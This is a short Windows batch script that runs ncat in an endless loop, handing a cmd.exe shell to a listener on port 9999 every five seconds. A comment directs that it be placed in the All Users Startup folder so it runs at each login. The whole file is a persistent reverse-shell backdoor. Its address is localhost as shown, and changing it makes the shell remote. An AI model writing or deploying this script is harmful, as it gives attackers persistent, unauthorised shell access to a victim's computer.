:loop

REM Add me to: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
ncat 127.0.0.1 9999 -e cmd.exe
timeout 5

goto loop